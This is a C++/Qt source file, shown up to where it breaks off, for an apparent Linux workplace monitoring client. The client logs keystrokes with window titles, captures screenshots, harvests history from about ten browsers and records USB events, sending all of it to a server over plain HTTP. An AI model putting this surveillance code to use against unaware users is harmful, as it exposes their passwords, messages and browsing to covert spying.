#include <QtCore/QDebug>
#include <QtCore/QDateTime>
#include <QtCore/QDir>
#include <QtCore/QProcess>
#include <QtCore/QSettings>
#include <QtCore/QUuid>
#include <QtCore/QStandardPaths>
#include <QtCore/QMutex>
#include <QtCore/QEventLoop>
#include <QtCore/QTimeZone>
#include <QtCore/QStorageInfo>

#include <QtGui/QScreen>
#include <QtGui/QPixmap>

#include <QtWidgets/QDesktopWidget>

#include <QtNetwork/QNetworkAccessManager>
#include <QtNetwork/QNetworkReply>
#include <QtNetwork/QHttpPart>

#include <QtDBus/QDBusInterface>
#include <QtDBus/QDBusReply>
#include <QtDBus/QDBusConnection>

#include <QtSql/QSqlDatabase>
#include <QtSql/QSqlQuery>
#include <QtSql/QSqlError>
#include <QtSql/QSqlRecord>

#include <QtNetwork/QNetworkInterface>

// #include "utils/desktopinfo.h"
#include "MonitorClient.h"
#include "ConfigDialog.h"
#include "functions.h"
#include "version.h"
#include "ConfigDialog.h"
#include <libudev.h>
#include <qarraydata.h>
#include <qchar.h>
#include <qdatetime.h>
#include <qglobal.h>
#include <qjsonobject.h>

#define TIC_INTERVAL 30
#define HISTORY_INTERVAL 120
#define KEY_INTERVAL 60
#define STORAGE_CHECK_INTERVAL 5

MonitorClient::MonitorClient()
{
    // Load settings first
    loadSettings("settings.ini");
    
    macAddress = getMacAddress();
    lastBrowserTic = -1;
    
    // Debug: Print loaded settings
    qDebug() << "Loaded Server IP:" << getServerIP();
    qDebug() << "Loaded Server Port:" << getServerPort();
    qDebug() << "Loaded Client Name:" << getClientName();
    qDebug() << "Local IP Address:" << getLocalIPAddress();
    qDebug() << "MAC Address:" << macAddress;
    // Initialize keyboard monitor
    keyboardMonitor = new KeyboardMonitor(this);
    connect(keyboardMonitor, &KeyboardMonitor::keyPressed, this, &MonitorClient::handleKeyPress);
    connect(this, &MonitorClient::usbEvent, keyboardMonitor, &KeyboardMonitor::handleUsbEvent);
    
    // Connect signals to their respective slots
    connect(this, &MonitorClient::screen, this, &MonitorClient::getScreen);
    connect(this, &MonitorClient::tic, this, &MonitorClient::sendTic);
    connect(this, &MonitorClient::browserHistory, this, &MonitorClient::sendBrowserHistories);
    connect(this, &MonitorClient::keyLog, this, &MonitorClient::sendKeyLogs);
    connect(this, &MonitorClient::usbLog, this, &MonitorClient::sendUSBLogs);
    
    if (!keyboardMonitor->startMonitoring()) {
        qDebug() << "Failed to start keyboard monitoring";
    }

    // Initialize storage monitoring
    getStorageDevices();

    // Initialize USB monitoring
    setupUsbMonitoring();
    
    // Initialize system tray
    setupSystemTray();
    
    // Initialize connection status
    serverConnected = false;
    lastError = "";
    clientName = getClientName();
    
    // Initialize status tracking
    screenshotEnabled = true;
    keylogEnabled = true;
    browserHistoryEnabled = true;
    usbMonitoringEnabled = true;
    
    // Initialize last sent times
    lastKeySentTime = QDateTime();
    lastUsbSentTime = QDateTime();
    lastBrowserSentTime = QDateTime();
    lastScreenshotSentTime = QDateTime();
    
    // Initialize connection error tracking
    connectionErrorNotified = false;
    
    // Initialize network manager
    networkManager = new QNetworkAccessManager(this);
}

MonitorClient::~MonitorClient()
{
    if (keyboardMonitor) {
        keyboardMonitor->stopMonitoring();
        delete keyboardMonitor;
        keyboardMonitor = nullptr;
    }
    cleanupUsbMonitoring();
    cleanupSystemTray();
}

QString MonitorClient::getMacAddress() {
    QString mac;
    
    QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
    
    for (const QNetworkInterface& interface : interfaces) {
        // Skip loopback and down interfaces
        if (interface.flags().testFlag(QNetworkInterface::IsLoopBack) ||
            !interface.flags().testFlag(QNetworkInterface::IsUp) ||
            !interface.flags().testFlag(QNetworkInterface::IsRunning)) {
            continue;
        }
        
        // Get the first valid MAC address
        if (!interface.hardwareAddress().isEmpty()) {
            mac = interface.hardwareAddress();
            break;
        }
    }
    
    return mac;
}

void MonitorClient::setupUsbMonitoring()
{
    udev = udev_new();
    if (!udev) {
        qDebug() << "Failed to create udev context";
        return;
    }

    monitor = udev_monitor_new_from_netlink(udev, "udev");
    if (!monitor) {
        qDebug() << "Failed to create udev monitor";
        udev_unref(udev);
        return;
    }

    // Filter for USB devices
    udev_monitor_filter_add_match_subsystem_devtype(monitor, "usb", "usb_device");
    udev_monitor_enable_receiving(monitor);
    udevFd = udev_monitor_get_fd(monitor);
}

void MonitorClient::cleanupUsbMonitoring()
{
    if (monitor) {
        udev_monitor_unref(monitor);
        monitor = nullptr;
    }
    if (udev) {
        udev_unref(udev);
        udev = nullptr;
    }
}

QString MonitorClient::getDeviceInfo(struct udev_device* dev)
{
    if (!dev) return QString();

    const char* vendor = udev_device_get_sysattr_value(dev, "idVendor");
    const char* product_name = udev_device_get_sysattr_value(dev, "product");

    return QString("%1 (VID: %2)")
        .arg(product_name ? product_name : "unknown")
        .arg(vendor ? vendor : "unknown");
}

void MonitorClient::processUsbEvent(struct udev_device* dev)
{
    if (!dev) return;

    const char* action = udev_device_get_action(dev);
    if (!action) return;

    const char* syspath = udev_device_get_syspath(dev);
    if (!syspath) return;

    QString deviceInfo;
    QString timestamp = QDateTime::currentDateTime().toTimeZone(QTimeZone("Asia/Vladivostok")).toString("yyyy-MM-dd HH:mm:ss");

    if (strcmp(action, "add") == 0) {
        deviceInfo = getDeviceInfo(dev);
        usbDeviceInfo[syspath] = deviceInfo;  // Store device info
        QJsonObject entryObj;
        entryObj["date"] = timestamp;
        entryObj["device_name"] = "Connected: " + deviceInfo;
        entryObj["action"] = "Nothing";  // Indicate this is a connection event

        usbLogs.append(entryObj);
        emit usbEvent();
    } else if (strcmp(action, "remove") == 0) {
        deviceInfo = usbDeviceInfo.value(syspath, "Unknown Device");  // Get stored info
        usbDeviceInfo.remove(syspath);  // Remove from map
        QJsonObject entryObj;
        entryObj["date"] = timestamp;
        entryObj["device_name"] = "Disconnected: " + deviceInfo;
        entryObj["action"] = "Nothing";  // Indicate this is a connection event

        usbLogs.append(entryObj);
        emit usbEvent();
    }
}

void MonitorClient::handleUsbEvent()
{
    if (!monitor) return;

    struct udev_device* dev = udev_monitor_receive_device(monitor);
    if (dev) {
        processUsbEvent(dev);
        udev_device_unref(dev);
    }
}

void MonitorClient::handleKeyPress(QString timestamp, const QString &windowTitle, const QString &keyText)
{
    QJsonObject entryObj;
    entryObj["date"] = timestamp;
    entryObj["application"] = windowTitle;
    entryObj["key"] = keyText;
    keyLogs.append(entryObj);
}

int MonitorClient::getScreen()
{
    QString filePath = "/tmp/tmp";
    int sendResult = 0;

    bool res;
    grabScreen(filePath, res);

    if (res) 
    {
        sendResult = sendScreens(filePath + ".jpg");
        if (sendResult < 0) {
            return 0;
        }
        
        // Clean up the temporary file
        QFile::remove(filePath + ".jpg");
    }
    
    return sendResult;
}

void MonitorClient::grabEntireDesktop(QString path, QPixmap& res, bool& ok)
{
    QDBusConnection connection = QDBusConnection::sessionBus();
    connection.registerService("org.gnome.Screenshot");
    QDBusInterface gnomeInterface(
        QStringLiteral("org.gnome.Shell"),
        QStringLiteral("/org/gnome/Shell/Screenshot"),
        QStringLiteral("org.gnome.Shell.Screenshot"),
        connection);
    QDBusReply<bool> reply = gnomeInterface.call(
        QStringLiteral("Screenshot"), false, false, path);
    if (reply.value()) {
        res = QPixmap(path);
        QFile dbusResult(path);
        dbusResult.remove();
    } else {
        ok = false;
    }
    connection.unregisterService("org.gnome.Screenshot");
}

void MonitorClient::grabScreen(QString filePath, bool& ok)
{
    QPixmap p;
    grabEntireDesktop(filePath + ".png", p, ok);
    if (ok) {
        // Optimize image quality and size for smaller file
        QImage image = p.toImage();
        
        // Resize if image is too large (optional - for very high resolution displays)
        if (image.width() > 1920 || image.height() > 1080) {
            image = image.scaled(1920, 1080, Qt::KeepAspectRatio, Qt::SmoothTransformation);
        }
        
        // Save with optimized JPEG compression
        ok = image.save(filePath + ".jpg", "JPEG", 70); // 70% quality for good balance
        
        // Log file size for monitoring
        QFileInfo fileInfo(filePath + ".jpg");
        qDebug() << "Screenshot saved:" << filePath + ".jpg" << "Size:" << fileInfo.size() / 1024 << "KB";
    }
}

int MonitorClient::sendScreens(QString filePath){

    int ret = -3;
    QEventLoop eventLoop;
    
    QString serverIP = getServerIP();
    int serverPort = getServerPort();

    if (!serverIP.isEmpty()) {
        QNetworkAccessManager mgr;
        QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));

        // the HTTP request
        QNetworkRequest req(QUrl(QString("http://%1:%2/webapi.php").arg(serverIP).arg(serverPort)));
        QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

        QHttpPart imagePart;
        imagePart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("image/jpeg"));
        imagePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("multipart/form-data; name=\"fileToUpload\"; filename=\""+filePath+"\""));
        imagePart.setRawHeader("Content-Transfer-Encoding","binary");
        QFile *file = new QFile(filePath);
        file->open(QIODevice::ReadOnly);
        imagePart.setBodyDevice(file);
        file->setParent(multiPart); // we cannot delete the file now, so delete it with the multiPart

        multiPart->append(imagePart);
        
        QNetworkReply *reply = mgr.post(req, multiPart);
        
        
        multiPart->setParent(reply); // delete the multiPart with the reply    
        eventLoop.exec(); // blocks stack until "finished()" has been called
        
        if (reply->error() == QNetworkReply::NoError) {
            // Check HTTP status code
            int statusCode = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
            if (statusCode == 200) {
                // Success - update last sent time
                lastScreenshotSentTime = QDateTime::currentDateTime();
                updateStatusDisplay();
                ret = 0; // Success
            } else {
                qDebug() << "Server returned status code:" << statusCode;
                ret = -1; // Server error
            }
            
            delete reply;
        }
        else {
            //failure
            qDebug() << "Failure" <<reply->errorString();
            delete reply;
        }
        
        return ret;
    }
    return ret;
}
int MonitorClient::sendTic(){

    int ret = -3;
    
    QString serverIP = getServerIP();
    int serverPort = getServerPort();

    if (!serverIP.isEmpty()) {
        
        // create custom temporary event loop on stack
        QEventLoop eventLoop;

        // "quit()" the event-loop, when the network request "finished()"
        QNetworkAccessManager mgr;
        QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));

        // the HTTP request
        QNetworkRequest req(QUrl(QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort)));
        // QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

        // QHttpPart eventPart;
        // eventPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"Event\""));
        // eventPart.setBody("Tic");
        
        // QHttpPart versionPart;
        // versionPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"Version\""));
        // versionPart.setBody(MONITORAPP_VERSION);

        // QHttpPart macAddressPart;
        // macAddressPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"MacAddress\""));
        // macAddressPart.setBody(macAddress.toUtf8());

        // multiPart->append(eventPart);
        // multiPart->append(versionPart);
        // multiPart->append(macAddressPart);

        // QNetworkReply *reply = mgr.post(req, multiPart);


        QJsonObject pingData;
        pingData["Event"] = "Tic";
        pingData["Version"] = MONITORAPP_VERSION;
        pingData["MacAddress"] = macAddress;
        pingData["Username"] = clientName;
        
        QJsonDocument doc(pingData);
        QByteArray data = doc.toJson();
        
        QNetworkRequest request(QUrl(QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort)));
        request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
        
        qDebug() << "Request Content-Type:" << request.header(QNetworkRequest::ContentTypeHeader);
        
        QNetworkReply *reply = mgr.post(request, data);


        eventLoop.exec(); // blocks stack until "finished()" has been called

        if (reply->error() == QNetworkReply::NoError) {
            // Check HTTP status code
            int statusCode = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
            if (statusCode == 200) {
                ret = 1; // Success
                serverConnected = true;
                lastError = "";
                connectionErrorNotified = false; // Reset error notification flag
                updateTrayIcon();
                updateTrayMenu();
                
                // Try to parse JSON response for additional data
                QJsonParseError jsonError;
                QJsonDocument jsonDoc = QJsonDocument::fromJson(reply->readAll(),&jsonError);
                if (jsonError.error == QJsonParseError::NoError && jsonDoc.isObject()) {
                    QJsonObject obj = jsonDoc.object();
                    if (obj.contains("LastBrowserTic")) {
                        lastBrowserTic = obj["LastBrowserTic"].toVariant().toLongLong();
                    }
                }
            } else {
                qDebug() << "Server returned status code:" << statusCode;
                ret = -1; // Server error
                serverConnected = false;
                lastError = QString("HTTP %1").arg(statusCode);
                showConnectionError(lastError);
            }
            
            delete reply;
        }
        else {
            //failure
            qDebug() << "Failure" <<reply->errorString();
            serverConnected = false;
            lastError = reply->errorString();
            showConnectionError(lastError);
            delete reply;
        }
    }
    
    return ret;
}

void MonitorClient::queryBrowserHistory(const QString& dbPath, const QString& query, const QString& browserName) {
    if (!QFile::exists(dbPath)) {
        return;
    }
    
    // Copy the database file since it might be locked by the browser
    QString tempDbPath = QDir::temp().filePath(QUuid::createUuid().toString() + ".db");
    if (!QFile::copy(dbPath, tempDbPath)) {
        qDebug() << "Failed to copy browser database";
        return;
    }
    
    {
        QSqlDatabase db = QSqlDatabase::addDatabase("QSQLITE", "browser_history");
        db.setDatabaseName(tempDbPath);
        
        if (db.open()) {
            QSqlQuery sqlQuery(db);
            
            // Get the last check time from server
            qint64 lastCheck = getLastCheckedTime(browserName);
            QString fieldNameForVisitTime = getFieldNameForVisitTime(browserName);

            // Build the query with correct WHERE/AND logic
            QString fullQuery = query.trimmed();
            QString condition = QString("%1 > %2").arg(fieldNameForVisitTime).arg(lastCheck);

            // Remove trailing ORDER BY if present
            QRegExp orderByRegex("\\bORDER\\s+BY\\b.*$", Qt::CaseInsensitive);
            QString orderByClause;
            int orderByPos = orderByRegex.indexIn(fullQuery);
            if (orderByPos != -1) {
                orderByClause = fullQuery.mid(orderByPos);
                fullQuery = fullQuery.left(orderByPos).trimmed();
            }

            // Add WHERE/AND condition
            if (fullQuery.contains(QRegExp("\\bWHERE\\b", Qt::CaseInsensitive))) {
                fullQuery += " AND " + condition;
            } else {
                fullQuery += " WHERE " + condition;
            }

            // Re-append ORDER BY if it was present
            if (!orderByClause.isEmpty()) {
                fullQuery += " " + orderByClause;
            } else {
                // Only add ORDER BY if not already present
                if (!fullQuery.contains(QRegExp("\\bORDER\\s+BY\\b", Qt::CaseInsensitive))) {
                    fullQuery += QString(" ORDER BY %1 ASC").arg(fieldNameForVisitTime);
                }
            }

            if (sqlQuery.exec(fullQuery)) {
                while (sqlQuery.next()) {
                    // Get visit_time as qint64 (may be microseconds or milliseconds depending on browser)
                    qint64 visitTime = sqlQuery.record().value("visit_time").toLongLong();
                    QDateTime dt;

                    // Convert visitTime to real time depending on browser
                    if (browserName == "Firefox" || browserName == "Midori") {
                        // Firefox/Midori: visit_time is in microseconds since epoch
                        dt = QDateTime::fromMSecsSinceEpoch(visitTime / 1000);
                    } else if (browserName == "Falkon") {
                        // Falkon: visit_time is in milliseconds since epoch
                        dt = QDateTime::fromMSecsSinceEpoch(visitTime);
                    } else {
                        // Chromium-based: visit_time is microseconds since 1601-01-01
                        // Convert to Unix epoch
                        qint64 unixTime = (visitTime / 1000000) - 11644473600LL;
                        dt = QDateTime::fromSecsSinceEpoch(unixTime);
                    }

                    QString url = sqlQuery.record().indexOf("url") != -1 ? sqlQuery.record().value("url").toString() : QString();
                    QString title = sqlQuery.record().indexOf("title") != -1 ? sqlQuery.record().value("title").toString() : QString();
                    QJsonObject historyItem;
                    historyItem["date"] = dt.toString("yyyy-MM-dd HH:mm:ss");
                    historyItem["browser"] = browserName;
                    historyItem["url"] = url;
                    if (!title.isEmpty()) {
                        historyItem["title"] = title;
                    }
                    browserHistories.append(historyItem);
                    if (lastCheck < visitTime) {
                        lastCheck = visitTime;
                    }
                }
                updateLastCheckedTime(browserName, lastCheck);
            } else {
                qDebug() << "Query failed:" << sqlQuery.lastError().text();
            }
            db.close();
        } else {
            qDebug() << "Failed to open database:" << db.lastError().text();
        }
    }
    
    QSqlDatabase::removeDatabase("browser_history");
    QFile::remove(tempDbPath);
    
}

QStringList MonitorClient::getMozBasedProfilePaths(const QString& browserPath) {
    QStringList profilePaths;
    
    // Traditional location
    QString firefoxPath = QDir::homePath() + browserPath;
    QDir dir(firefoxPath);
    QStringList filters;
    filters << "*.default-release" << "*.default-*" << "*.default" << "*.dev-edition-default" << "*.esr";
    QStringList profileDirs = dir.entryList(filters, QDir::Dirs);
    
    for (const QString& profileDir : profileDirs) {
        QString profilePath = firefoxPath + profileDir + "/places.sqlite";
        if (QFile::exists(profilePath)) {
            profilePaths.append(profilePath);
        }
    }

    // Check for additional profiles (Profile 1, Profile 2, etc.)
    QStringList additionalFilters;
    additionalFilters << "Profile*";
    QStringList additionalProfileDirs = dir.entryList(additionalFilters, QDir::Dirs);
    
    for (const QString& profileDir : additionalProfileDirs) {
        QString profilePath = firefoxPath + profileDir + "/places.sqlite";
        if (QFile::exists(profilePath)) {
            profilePaths.append(profilePath);
        }
    }

    QString snapPath;
    if (browserPath == "/.midori") {
        snapPath = QDir::homePath() + "/snap/midori/current/.config/midori/history.db";
        // Check Snap Midori location first
        if (QFile::exists(snapPath)) {
            profilePaths.append(snapPath);
        }
        // Fall back to traditional Midori location
        QString traditionalPath = QDir::homePath() + browserPath;
        if (QFile::exists(traditionalPath)) {
            profilePaths.append(traditionalPath);
        }
    } else {
        snapPath = QDir::homePath() + "/snap/firefox/common/.mozilla/firefox/";
        QDir snapDir(snapPath);
        QStringList snapFilters;
        snapFilters << "*.default" << "*.default-release" << "*.default-*" << "Profile*";
        QStringList snapProfileDirs = snapDir.entryList(snapFilters, QDir::Dirs);
        
        for (const QString& profileDir : snapProfileDirs) {
            QString profilePath = snapPath + profileDir + "/places.sqlite";
            if (QFile::exists(profilePath)) {
                profilePaths.append(profilePath);
            }
        }
    }

    return profilePaths;
}

QStringList MonitorClient::getChromiumBasedProfilePaths(const QString& browserPath) {
    QStringList profilePaths;
    QString path = QDir::homePath() + browserPath;
    QDir dir(path);
    
    if (dir.exists()) {
        // Get all profile directories
        QStringList profileDirs = dir.entryList(QDir::Dirs | QDir::NoDotAndDotDot);
        
        for (const QString& profileDir : profileDirs) {
            QString profilePath = path + "/" + profileDir + "/History";
            if (QFile::exists(profilePath)) {
                profilePaths.append(profilePath);
            }
        }
    }
    
    return profilePaths;
}

void MonitorClient::getFirefoxHistory() {
    QStringList profilePaths = getMozBasedProfilePaths("/.mozilla/firefox/");
    
    qDebug() << "Firefox history path:" << profilePaths;
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            // This query will extract url, title, and visit_time (microseconds since epoch)
            QString query =
                "SELECT p.url AS url, p.title AS title, h.visit_date AS visit_time "
                "FROM moz_places p JOIN moz_historyvisits h ON p.id = h.place_id";
            queryBrowserHistory(dbPath, query, "Firefox");
        }
    }
    
}

void MonitorClient::getChromeHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/google-chrome/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url AS url, urls.title AS title, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Chrome");
        }
    }
    
}

void MonitorClient::getEdgeHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/microsoft-edge/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url AS url, urls.title AS title, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Edge");
        }
    }
    
}

void MonitorClient::getOperaHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/opera/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url AS url, urls.title AS title, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Opera");
        }
    }
    
}

void MonitorClient::getBraveHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/BraveSoftware/Brave-Browser/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url AS url, urls.title AS title, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Brave");
        }
    }
    
}

void MonitorClient::getMidoriHistory() {
    QStringList profilePaths = getMozBasedProfilePaths("/.midori/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_date/1000, 'unixepoch', '+10:00') as last_visit_time, p.url, h.visit_date as visit_time "
                           "FROM moz_places p JOIN moz_historyvisits h ON p.id = h.place_id ";
            queryBrowserHistory(dbPath, query, "Midori");
        }
    }
    
}

void MonitorClient::getYandexHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/yandex-browser/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url as url, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Yandex");
        }
    }
    
}

void MonitorClient::getSlimjetHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/slimjet/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url as url, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Slimjet");
        }
    }
    
}

void MonitorClient::getFalkonHistory() {
    QStringList profilePaths;
    QString falkonBasePath = QDir::homePath() + "/.config/falkon/profiles/";
    QDir falkonDir(falkonBasePath);
    
    if (falkonDir.exists()) {
        QStringList profileDirs = falkonDir.entryList(QDir::Dirs | QDir::NoDotAndDotDot);
        for (const QString& profileDir : profileDirs) {
            QString profilePath = falkonBasePath + profileDir + "/browsedata.db";
            if (QFile::exists(profilePath)) {
                profilePaths.append(profilePath);
            }
        }
    }
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(date/1000, 'unixepoch', '+10:00') as last_visit_time, url, date as visit_time "
                           "FROM history WHERE id > 0";
            queryBrowserHistory(dbPath, query, "Falkon");
        }
    }
    
}

void MonitorClient::getBrowserHistory() {
    // Get Firefox history
    getFirefoxHistory();
    
    // Get Chrome history
    getChromeHistory();
    
    // Get Edge history
    getEdgeHistory();
    
    // Get Opera history
    getOperaHistory();
    
    // Get Brave history
    getBraveHistory();
    
    // Get Falkon history
    getFalkonHistory();
    
    // Get Midori history
    getMidoriHistory();
    
    // Get Yandex history
    getYandexHistory();
    
    // Get Slimjet history
    getSlimjetHistory();
    
    // Get Vivaldi history
    getVivaldiHistory();
}

QString MonitorClient::getJsonObjectListAsJsonString(const QList<QJsonObject>& jsonObjectList) {
    QJsonArray jsonArray;
    for (const QJsonObject& obj : jsonObjectList) {
        jsonArray.append(obj);
    }
    
    QJsonDocument doc(jsonArray);
    return doc.toJson(QJsonDocument::Compact);
}

int MonitorClient::sendBrowserHistories() {
    int ret = -3;
    QString serverIP = getServerIP();
    int serverPort = getServerPort();
    if (!serverIP.isEmpty() && serverPort > 0) {
        // Get browser histories
        getBrowserHistory();
        
        if (!browserHistories.isEmpty()) {
            QString browserHistoriesJsonString = getJsonObjectListAsJsonString(browserHistories);
            qDebug() << "Browser histories:" << browserHistoriesJsonString;

            qDebug() << "Sending browser histories in chunks...";
            
            // Split into chunks of 1000 entries
            QList<QList<QJsonObject>> chunks = chunkData(browserHistories, 1000);
            
            qDebug() << "Sending" << browserHistories << " browser history";
            qDebug() << "Sending" << chunks << "chunks of browser history";
            
            // Send each chunk
            for (int i = 0; i < chunks.size(); ++i) {
                qDebug() << "Sending chunk" << (i + 1) << "of" << chunks.size();
                QString chunkJsonString = getJsonObjectListAsJsonString(chunks[i]);
                ret = sendDataChunk(serverIP, serverPort, "BrowserHistory", "BrowserHistories", chunkJsonString);
                
                if (ret == 1) {
                    // Success - update last sent time
                    lastBrowserSentTime = QDateTime::currentDateTime();
                    updateStatusDisplay();
                } else {
                    qDebug() << "Failed to send browser history chunk" << (i + 1);
                    break;
                }
                
                // Small delay between chunks to avoid overwhelming the server
                QThread::msleep(100);
            }

            browserHistories.clear(); // Clear browser histories after sending
        } else {
            qDebug() << "No browser history to send";
            ret = 1; // Success (no data to send)
        }
    }
    
    return ret;
}

void MonitorClient::getStorageDevices()
{
    struct udev* udev = udev_new();
    if (!udev) {
        return;
    }

    struct udev_enumerate* enumerate = udev_enumerate_new(udev);
    udev_enumerate_add_match_subsystem(enumerate, "usb");
    udev_enumerate_scan_devices(enumerate);

    struct udev_list_entry* devices_list = udev_enumerate_get_list_entry(enumerate);
    struct udev_list_entry* entry;
    udev_list_entry_foreach(entry, devices_list) {
        const char* path = udev_list_entry_get_name(entry);
        struct udev_device* dev = udev_device_new_from_syspath(udev, path);
        
        if (dev) {
            if (udev_device_get_devtype(dev) && strcmp(udev_device_get_devtype(dev), "usb_device") == 0) {
                const char* syspath = udev_device_get_syspath(dev);
                if (syspath) {
                    QString deviceInfo = getDeviceInfo(dev);
                    usbDeviceInfo[syspath] = deviceInfo;  // Store device info
                    
                    QString timestamp = QDateTime::currentDateTime().toTimeZone(QTimeZone("Asia/Vladivostok")).toString("yyyy-MM-dd HH:mm:ss");
                    QJsonObject entryObj;
                    entryObj["date"] = timestamp;
                    entryObj["device_name"] = "Connected: " + deviceInfo;
                    entryObj["action"] = "Nothing";  // Indicate this is a connection event
                    qDebug() << "Connected: " + deviceInfo;
                    usbLogs.append(entryObj);
                }
            }
            udev_device_unref(dev);
        }
    }
    
    udev_enumerate_unref(enumerate);
    udev_unref(udev);
}

void MonitorClient::run()
{
    qint64 lastTicTime = QDateTime::currentSecsSinceEpoch();
    qint64 lastHistoryTime = lastTicTime;
    qint64 lastKeyLogTime = lastTicTime;
    
    while (!isInterruptionRequested()) {
        if (checkActiveScreen() > 0)
        {
            qint64 currentTime = QDateTime::currentSecsSinceEpoch();
            
            // Check for USB events
            if (udevFd >= 0) {
                fd_set fds;
                struct timeval tv;
                FD_ZERO(&fds);
                FD_SET(udevFd, &fds);
                tv.tv_sec = 0;
                tv.tv_usec = 0;

                if (select(udevFd + 1, &fds, NULL, NULL, &tv) > 0) {
                    handleUsbEvent();
                }
            }

            // Send tic every TIC_INTERVAL seconds
            if (currentTime - lastTicTime >= TIC_INTERVAL) {
                emit tic();
                lastTicTime = currentTime;
            }
            
            // Send browser histories every HISTORY_INTERVAL seconds
            if (currentTime - lastHistoryTime >= HISTORY_INTERVAL && browserHistoryEnabled) {
                if (lastBrowserTic != -1) {
                    emit browserHistory();
                    lastHistoryTime = currentTime;
                }
            }
            
            // Send key logs every KEY_INTERVAL seconds
            if (currentTime - lastKeyLogTime >= KEY_INTERVAL && keylogEnabled) {
                emit keyLog();
                if (usbMonitoringEnabled) {
                    emit usbLog();
                }
                lastKeyLogTime = currentTime;
            }
        }
        
        QThread::msleep(1000);  // Sleep for 1 second
    }
}

qint64 MonitorClient::convertUnixtimestampToBrowserTime(const QString& browserName, const qint64 unixtimestamp) {
    if (browserName == "Firefox" || browserName == "Midori") {
        // Convert Unix timestamp (seconds) to microseconds
        return unixtimestamp * 1000000;
    } else if (browserName == "Chrome" || browserName == "Edge" || browserName == "Opera" || 
               browserName == "Brave" || browserName == "Yandex" || browserName == "Slimjet" || 
               browserName == "Vivaldi") {
        // Chromium-based browsers use microseconds since Jan 1, 1601
        // First convert Unix timestamp to microseconds, then add microseconds from 1601 to 1970
        const qint64 WINDOWS_TO_UNIX_EPOCH = 11644473600LL; // Seconds between 1601 and 1970
        return (unixtimestamp + WINDOWS_TO_UNIX_EPOCH) * 1000000;
    } else if (browserName == "Falkon") {
        return unixtimestamp * 1000;
    }
    return unixtimestamp; // Default case
}

qint64 MonitorClient::getLastCheckedTime(const QString& browserName) {
    if (!lastCheckedTimes.contains(browserName)) {
        lastCheckedTimes[browserName] = convertUnixtimestampToBrowserTime(browserName, lastBrowserTic);
    }
    return lastCheckedTimes.value(browserName);
}

void MonitorClient::updateLastCheckedTime(const QString& browserName, const qint64 timestamp) {
    lastCheckedTimes[browserName] = timestamp;
}

QString MonitorClient::getFieldNameForVisitTime(const QString& browserName) {
    if (browserName == "Firefox" || browserName == "Midori") {
        return "visit_date";
    } else if (browserName == "Chrome" || browserName == "Edge" || browserName == "Opera" || 
               browserName == "Brave" || browserName == "Yandex" || browserName == "Slimjet" || 
               browserName == "Vivaldi") {
        return "visit_time";
    }
    return "date";
}

int MonitorClient::sendKeyLogs()
{
    int ret = -3;
    if (!keyLogs.isEmpty()) {
        qDebug() << "Sending key logs in chunks...";
        
        QString serverIP = getServerIP();
        int serverPort = getServerPort();
        if (!serverIP.isEmpty() && serverPort > 0) {
            // Split into chunks of 1000 entries
            QList<QList<QJsonObject>> chunks = chunkData(keyLogs, 1000);
            
            qDebug() << "Sending" << chunks.size() << "chunks of key logs";
            
            // Send each chunk
            for (int i = 0; i < chunks.size(); ++i) {
                qDebug() << "Sending key log chunk" << (i + 1) << "of" << chunks.size();
